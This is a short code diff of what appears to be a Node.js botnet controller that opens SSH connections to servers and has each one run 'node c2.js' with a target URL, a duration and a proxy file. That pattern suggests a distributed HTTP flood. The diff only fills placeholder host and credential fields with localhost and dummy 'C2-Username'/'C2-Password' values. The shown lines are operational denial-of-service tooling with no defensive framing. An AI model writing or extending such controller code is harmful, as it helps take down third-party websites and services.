@@ -18,10 +18,10 @@ conn.on('ready', () => {
     stream.end('node c2.js ' + url + ' ' + time + ' http.txt\nexit\n');
   });
 }).connect({
-  host: '???',
+  host: '127.0.0.1',
   port: 22,
-  username: '???',
-  password: '???'
+  username: 'C2-Username',
+  password: 'C2-Password'
 });
 console.log('Client > 1 connected');
 
@@ -38,10 +38,10 @@ conn1.on('ready', () => {
   });
 })
 conn1.connect({
-  host: '???',
+  host: '127.0.0.1',
   port: 22,
-  username: '???',
-  password: '???'
+  username: 'C2-Username',
+  password: 'C2-Password'
 });
 
 console.log('Client > 2 connected');
